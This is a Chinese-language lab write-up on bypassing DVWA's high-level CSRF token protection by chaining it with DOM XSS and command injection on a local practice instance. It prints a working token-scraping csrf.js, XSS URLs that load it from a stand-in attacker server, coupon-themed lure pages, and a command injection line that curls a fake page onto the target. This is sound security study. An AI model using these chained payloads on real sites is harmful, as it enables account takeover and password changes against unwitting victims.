# Cross Site Request Forgery (CSRF)

### 觀察

根據提示這次有加了 user token


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/bbd23ae6-2623-4e0d-a58b-d759a1708d0e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070041Z&X-Amz-Expires=86400&X-Amz-Signature=f8b7eaa984a0dd32ed39d29c60aad1ca56351d8636ed0ee01c6ab6a099888aba&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

觀察 request 後發現它在參數後面也多加了 `user_token`

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/81dc0204-0388-4e0c-8a5f-c9f338465d5b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070057Z&X-Amz-Expires=86400&X-Amz-Signature=b4ef4da76636444ed6ddb403098c1aa56fb690d5192c5950b72aab135ee3aedb&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```json
{
	"GET": {
		"scheme": "http",
		"host": "dvwa.localtest",
		"filename": "/vulnerabilities/csrf/",
		"query": {
			"password_new": "123",
			"password_conf": "456",
			"Change": "Change",
			"user_token": "afb43b5a4caf4e9eb101a2a814598fa3"
		},
		"remote": {
			"Address": "127.0.0.1:80"
		}
	}
}
```

這題主要的阻礙就是必須提前拿到 user_token，但這如果只透過我們提供的惡意頁面很難一步達成，因此必須思考如何拿到 token 之後再送出 CSRF 攻擊

如果要搭配 XSS 攻擊的話，那也許可以在該頁面想辦法插入 script，但可惜的是這題頁面好像沒有地方可以注入 XSS (也許有，但我目前沒辦法輕易做到 QQ)

那如果用 sql injection 或 command injection 搭配呢? 用 sqlmap 掃也沒掃到，可能要手動測試試試看，但想到這就有點懶，只好先躺平一下

參考其他人的 writeup 後，看到不少人是利用 DVWA 其他頁面的 XSS 來攻擊，也有人乾脆直接將惡意頁面 upload 😶‍🌫️

### CSRF + XSS

在 token 和同源政策這兩個限制之下，必須要在目標網站上分兩階段攻擊:

1. 先埋好 XSS or 惡意腳本
2. 讓受害者觸發 CSRF

那我們就來試試看可不可行

先準備 XSS 攻擊使用的 script

`csrf.js`

```jsx
var xhr = new XMLHttpRequest(),
  method = 'GET',
  url = 'http://dvwa.localtest/vulnerabilities/csrf/'

xhr.open(method, url, true)
xhr.onreadystatechange = function () {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    console.log(xhr.responseText)
    const csrfPage = xhr.responseText
    const token = csrfPage.match(/'user_token' value='(.*)'/i)[1]
    const password = 4444
    const url = `http://dvwa.localtest/vulnerabilities/csrf/?password_new=${password}&password_conf=${password}&Change=Change&user_token=${token}`
    const xhrUpdatePwd = new XMLHttpRequest()
    xhrUpdatePwd.open('GET', url, true)
    xhrUpdatePwd.onreadystatechange = function () {
      if (xhrUpdatePwd.readyState === XMLHttpRequest.DONE && xhrUpdatePwd.status === 200) {
        console.log(xhrUpdatePwd.responseText)
      }
    }
    xhrUpdatePwd.send()
  }
}
xhr.send()
```

執行起來沒問題
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/0d75a702-f1ed-4985-bc30-24d568e86694/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070128Z&X-Amz-Expires=86400&X-Amz-Signature=163f7a3bea8acba00e4b285757a98d186c23f51e405f242e6f1a66b790b89466&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```jsx
<pre>Password Changed.</pre>
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/8b767c9a-45a6-41f1-b3a9-4ef5e50b5a77/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070144Z&X-Amz-Expires=86400&X-Amz-Signature=ffb91171a009be65e6c9cf80a37302e3ae83e211611b7c572310266bfdcbf99d&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

### 到其他頁面測試 XSS payload

先到之前 DOM based XSS 頁面

```html
Go to http://dvwa.localtest/vulnerabilities/xss_d/
```

複習一下 XSS

```html
?default=English#<script>alert(123)</script>
```

```html
http://dvwa.localtest/vulnerabilities/xss_d/?default=English#<script>alert(123)</script>
```

or

```html
?default=English<script>alert(123)</script>&default=English#
```

```
http://dvwa.localtest/vulnerabilities/xss_d/?default=English%3Cscript%3Econsole.log(123)%3C/script%3E&default=English#
```

將剛剛準備好的 script 整合進 XSS

先測試一下是否能遠端載入 js file，我們先隨便從任何一個 CDN 載入一個函式庫看看

```
https://unpkg.com/axios@0.2.1/dist/axios.min.js
```

```
http://dvwa.localtest/vulnerabilities/xss_d/?default=English%3Cscript%20src=%22https://unpkg.com/axios@0.2.1/dist/axios.min.js%22%3Econsole.log(123)%3C/script%3E&default=English#
```

很幸運的並沒有 CSP 限制，成功載入，這代表我們的攻擊應該會很順利

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/4b73dbaa-2ca7-4359-b253-4c50de09b0b2/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070212Z&X-Amz-Expires=86400&X-Amz-Signature=0d5f5ae2226cce05d540ca459a097dd15be9f1ab9d894248d1ce9120f7d77d9b&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```
Navigated to http://dvwa.localtest/vulnerabilities/xss_d/?default=English%3Cscript%20src=%22https://unpkg.com/axios@0.2.1/dist/axios.min.js%22%3Econsole.log(123)%3C/script%3E&default=English#
GEThttp://dvwa.localtest/vulnerabilities/xss_d/?default=English<script src="https://unpkg.com/axios@0.2.1/dist/axios.min.js">console.log(123)</script>&default=English#

[HTTP/1.1 200 OK 5ms]

GEThttp://dvwa.localtest/dvwa/js/dvwaPage.js
[HTTP/1.1 200 OK 0ms]

GEThttp://dvwa.localtest//dvwa/js/add_event_listeners.js
[HTTP/1.1 200 OK 0ms]

GEThttps://unpkg.com/axios@0.2.1/dist/axios.min.js
[HTTP/2 200 OK 0ms]

GEThttp://dvwa.localtest/favicon.ico
[HTTP/1.1 200 OK 0ms]
```

接著測看看我們的惡意 js file 能不能被遠端載入

http-server - npm
https://www.npmjs.com/package/http-server

我們用 [http-server](https://www.npmjs.com/package/http-server) 當作駭客的伺服器，將惡意檔案放在 `http://127.0.0.1:8080/csrf.js`

要記得開啟 `—cors` 選項，不然會無法載入，會碰到類似這樣的訊息

```
Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at http://127.0.0.1:8080/csrf.js. (Reason: CORS header ‘Access-Control-Allow-Origin’ missing). Status code: 200.
```

加上 Access-Control-Allow-Origin: * 允許來自任何網域的 ajax 請求

```
http-server --cors='Access-Control-Allow-Origin: *'
```

```
http://127.0.0.1:8080/csrf.js
```

### 模擬受害者

現在假裝是受害者踩到惡意連結

```html
http://dvwa.localtest/vulnerabilities/xss_d/?default=English<script src="http://127.0.0.1:8080/csrf.js">console.log('hi')</script>&default=English#
```

```
http://dvwa.localtest/vulnerabilities/xss_d/?default=English%3Cscript%20type=%22module%22%20src=%22http://127.0.0.1:8080/csrf.js%22%3Econsole.log(%27hi%27)%3C/script%3E&default=English#
```

惡意連結頁面

`get-img-redirect-high.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>csrf - get-img-redirect-high</title>
</head>
<body>
set password to: 4444

<a href="http://dvwa.localtest/vulnerabilities/xss_d/?default=English<script src='http://127.0.0.1:8080/csrf.js'>console.log('hi')</script>&default=English#">
  get your free coupon
</a>

<script>
  console.log(`your cookie is: ${document.cookie}`)
</script>
</body>
</html>
```

成功將密碼改成 4444
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/2d1464d2-43b5-44f4-ae65-bcd7b1802904/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070324Z&X-Amz-Expires=86400&X-Amz-Signature=b9b0b70402bf1ef65f33337224daa51503e0a90070708e20387f9856196ad1d6&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/2d1464d2-43b5-44f4-ae65-bcd7b1802904/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070324Z&X-Amz-Expires=86400&X-Amz-Signature=b9b0b70402bf1ef65f33337224daa51503e0a90070708e20387f9856196ad1d6&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

但如果想要更隱密的方式，不讓受害者察覺的話，可能就要嘗試其他方法，因為跳轉的方式很明顯會讓人起疑心．

### CSRF + File upload + fake page

### 將惡意檔案上傳到目標網站

如果你是在聊天直接丟惡意連結給受害者讓他點擊，上面的方法就可以直接拿來用，但如果你想要做到更細緻一點的做法，就要避免用跳轉的方式攻擊，改用 xhr 的方式送出惡意 request，不過似乎沒那麼容易，尤其在現代瀏覽器預設安全政策或設定較嚴謹的情況下．

1. 瀏覽器阻擋跨站台 cookie 追蹤
2. SOP

因此最保險的方式就是將 CSRF 惡意連結或惡意頁面放在跟目標網站 (DVWA) 一樣的域名底下 (雖然樣就不再是原始的 CSRF 了，從 Cross Site 變成 Same Site ? )，這部分有很多變化，例如將原本的頁面地換成惡意頁面, 透過 Stored XSS 埋惡意連結, overlay 等等...

比較快速的方式就是跟 [這篇 writeup](https://systemweakness.com/hackerman-sergio-csrf-tutorial-dvwa-high-security-level-4cba47f2d695) 所寫的一樣，直接上傳頁面 (可以偽裝成活動或送貼圖的頁面之類的)

### CSRF + Command injection + 替換頁面

這部分跟上傳新的惡意頁面差不多，只是把正常網頁替換成偷加料的網頁

先準備好一個偽裝過的頁面，裡面有之前使用的惡意連結 (透過 XSS 注入會執行 CSRF 的遠端 js file)

`fakepage.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>test CSRF - high</title>
</head>
<body>
You got free coupons 💸💸💸
<img src="http://dvwa.localtest/vulnerabilities/xss_d/?default=English<script src='http://127.0.0.1:8080/csrf.js'>console.log(document.cookie)</script>&default=English#">
</body>
</html>
```

`http://127.0.0.1:8080/fakepage.html` 是駭客的惡頁面遠端位置

我們先透過 comand injection 下載該檔案

```bash
'' || curl "http://127.0.0.1:8080/fakepage.html" > ../../hackable/fakepage.html
```

這樣一來目標網站上就有我們偽造的惡意頁面了，雖然之前因為 `-` 被過濾的關係，檔名發生了一些改變，因此惡意頁面的檔案不能有 `-`

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/3b7db02b-fd00-4c18-8d9f-50afa5eeef71/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070423Z&X-Amz-Expires=86400&X-Amz-Signature=130c7cd021b4690e8f0c03155794ba8bef9269c46ff46224414fc9d88de9fac2&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)
上圖可以看出透過 command injection 下指令下載檔案時，檔案名稱中的某些字元可能會被跳脫或移除，所以只能用有限的檔案命名組合，避開特殊字元

將惡意頁面檔案名稱改為 `fakepage.html` 就能正常被下載了
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/e029562b-d366-4435-8dfa-7219fbcaea5c/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070516Z&X-Amz-Expires=86400&X-Amz-Signature=e34f730cffe970f5056c5fd6462d87d54f893f67e5c6ee51778372a3ff222210&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

偷渡成功了

```bash
'' || ls ../../hackable
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/b76df93c-50d2-42c1-a5e8-7315e08de915/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070549Z&X-Amz-Expires=86400&X-Amz-Signature=0173cba991a69ed5156766ca713c6c985b0ac376482b6051962031104be04e18&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)


用下載或上傳檔案的方式可以確保惡內容令或 payload 不被阻斷，檢查一下檔案內容應該是完整的
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/a2fb6294-bfb2-4068-8c0a-3f10c2b401d6/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070709Z&X-Amz-Expires=86400&X-Amz-Signature=cbbc3737c48becb1da5f2e95c327eff559ccbf86cbd8f06474db7dfc60eb699e&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

最後只要讓受害者前往該頁面就可以觸發 CSRF 攻擊更改密碼了

```html
http://dvwa.localtest/hackable/fakepage.html
```

⚠️ 要記得先設定預設難度為 high 而非 impossible，避免造成 csrf.js 的 CSRF 攻擊失效

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/f1c2b3c9-ca21-4d4b-8c03-3f33c98152c4/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070743Z&X-Amz-Expires=86400&X-Amz-Signature=f7dd9ba92073096d3b4930b519410b55f784b8d867f5b12384a4b8e511ceb698&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

### Failed - img tag

看起來 XSS 沒有正常注入到選單，有可能是 img 載入頁面的方式沒辦法正常觸發頁面的 XSS 攻擊 (可能要看目標頁面的 source code 和你的 XSS 的寫法而定)

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/55e08915-a569-4c4e-b955-aa5d8b562e94/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070806Z&X-Amz-Expires=86400&X-Amz-Signature=cb8c6f0f6a0fa5436bd5a4f8a7488d9f971b2bedfda26e379eb3384a2cfb0ab9&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

將 `img tag` 改為 `iframe` 試試看

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/27f57182-884e-47be-91f0-0caa2bbe7e31/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070823Z&X-Amz-Expires=86400&X-Amz-Signature=a46d1cb7dec86cb3a03aaded87231ed34f158dd33e466d826da9dca9c5b8895f&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)


```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>test CSRF - high</title>
</head>
<body>
You got free coupons 💸💸💸
<iframe src="http://dvwa.localtest/vulnerabilities/xss_d/?default=English<script src='http://127.0.0.1:8080/csrf.js'>console.log(document.cookie)</script>&default=English#"></iframe>
</body>
</html>
```

### Done - iframe tag

終於成功了 😭

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/13aba80a-7d91-4377-b072-42f0d4c7c705/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220226%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220226T070854Z&X-Amz-Expires=86400&X-Amz-Signature=517b497cc5b5433d2c75111855fae41e964aad040ded36db8965ee94b4d830f9&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

透過 iframe 引入可以正常執行 csrf.js 的內容

### 心得

CSRF 是我目前覺得最迂迴且不穩定的技巧，在現代瀏覽器安全限制都不低的清況下，成功率可能不高，而且會需要搭配其他漏洞一起使用，串連其他攻擊方式時也不容易測試，因為有很多小環節要注意．

但練習時可以讓自己重新 review 很多瀏覽器相關的議題 (SOP, CORS, Cookie Tracking Protection, SameSite Cookies Policy 這類的限制)，因為它們都有可能會影響 CSRF．

結論: 攻擊手法或組合越多，攻擊就越脆弱不穩定 (就跟 dependency 越多越容易出錯一樣)，因為要成立的條件越多

---

### Ref

- CSRF Tutorial (DVWA High Security Level) | by Sam Onaro | Mar, 2021 | System Weakness | System Weakness
  [https://systemweakness.com/hackerman-sergio-csrf-tutorial-dvwa-high-security-level-4cba47f2d695](https://systemweakness.com/hackerman-sergio-csrf-tutorial-dvwa-high-security-level-4cba47f2d695)
- A new default Referrer-Policy for Chrome: strict-origin-when-cross-origin  |  Web  |  Google Developers
  [https://developers.google.com/web/updates/2020/07/referrer-policy-new-chrome-default](https://developers.google.com/web/updates/2020/07/referrer-policy-new-chrome-default)
- DVWA CSRF 通关教程 - 御用闲人 - 博客园
  [https://www.cnblogs.com/yyxianren/p/11381285.html](https://www.cnblogs.com/yyxianren/p/11381285.html)
- DVWA 1.10 High等级的CSRF另类通关法 - FreeBuf网络安全行业门户
  [https://www.freebuf.com/articles/web/203301.html](https://www.freebuf.com/articles/web/203301.html)
- [教學] CORS 是什麼? 如何設定 CORS? | Shubo 的程式教學筆記
  [https://shubo.io/what-is-cors/](https://shubo.io/what-is-cors/)
- SOP vs CORS? - DEV Community
  [https://dev.to/caffiendkitten/sop-vs-cors-49l6](https://dev.to/caffiendkitten/sop-vs-cors-49l6)
- 理解“同站”和“同源”
  [https://web.dev/same-site-same-origin/](https://web.dev/same-site-same-origin/)
